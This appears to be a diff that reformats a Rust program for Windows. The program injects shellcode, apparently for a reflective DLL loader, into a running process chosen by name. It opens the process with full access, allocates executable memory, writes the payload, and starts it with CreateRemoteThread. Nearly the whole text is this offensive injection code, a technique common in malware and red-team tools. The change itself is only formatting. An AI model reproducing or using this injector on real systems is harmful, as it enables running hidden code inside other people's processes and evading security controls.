@@ -1,6 +1,13 @@
-use std::{ptr::null_mut, env};
-use sysinfo::{SystemExt, Pid, ProcessExt};
-use windows_sys::Win32::{System::{Threading::{OpenProcess, PROCESS_ALL_ACCESS, CreateRemoteThread}, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}, Diagnostics::Debug::{WriteProcessMemory}}, Foundation::{CloseHandle}};
+use std::{env, ptr::null_mut};
+use sysinfo::{Pid, ProcessExt, SystemExt};
+use windows_sys::Win32::{
+    Foundation::CloseHandle,
+    System::{
+        Diagnostics::Debug::WriteProcessMemory,
+        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
+        Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
+    },
+};
 
 fn main() {
     env_logger::init();
@@ -14,7 +21,7 @@ fn main() {
 
     let process_name = &args[1];
     let file_path = &args[2];
-    
+
     let process_id = get_process_id_by_name(process_name) as u32;
     log::debug!("[+] Process ID: {}", process_id);
 
@@ -24,13 +31,7 @@ fn main() {
     let module_base = image_bytes.as_ptr();
 
     // Get a handle to the target process with PROCESS_ALL_ACCESS
-    let process_handle = unsafe { 
-        OpenProcess(
-            PROCESS_ALL_ACCESS,
-            0,
-            process_id
-        )
-    };
+    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };
 
     if process_handle == 0 {
         panic!("Failed to open a handle to the target process");
@@ -39,17 +40,20 @@ fn main() {
     log::debug!("[+] Process handle: {:?}", process_handle);
 
     // Allocate memory in the target process for the shellcode
-    let shellcode_address = unsafe { 
+    let shellcode_address = unsafe {
         VirtualAllocEx(
             process_handle,
             null_mut(),
             module_size, // was sizeOfImage for RDI
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
+            PAGE_EXECUTE_READWRITE,
         )
     };
 
-    log::debug!("[+] Allocated memory in the target process for the shellcode: {:p}", shellcode_address);
+    log::debug!(
+        "[+] Allocated memory in the target process for the shellcode: {:p}",
+        shellcode_address
+    );
 
     if shellcode_address.is_null() {
         panic!("Failed to allocate memory in the target process for the shellcode");
@@ -74,22 +78,22 @@ fn main() {
     //pause();
 
     // Create remote thread and execute our shellcode
-    let thread_handle = unsafe { 
+    let thread_handle = unsafe {
         CreateRemoteThread(
-        process_handle,
-        null_mut(),
-        0,
-        Some(std::mem::transmute(shellcode_address as usize)),
-        std::ptr::null_mut(), // Can be used to pass the first parameter to loader but we're using shellcode to call our loader with more parameters
-        0,
-        null_mut(),
+            process_handle,
+            null_mut(),
+            0,
+            Some(std::mem::transmute(shellcode_address as usize)),
+            std::ptr::null_mut(), // Can be used to pass the first parameter to loader but we're using shellcode to call our loader with more parameters
+            0,
+            null_mut(),
         )
     };
 
     // Close thread and process handle
-    unsafe { 
+    unsafe {
         CloseHandle(thread_handle);
-        CloseHandle(process_handle); 
+        CloseHandle(process_handle);
     };
 }
 
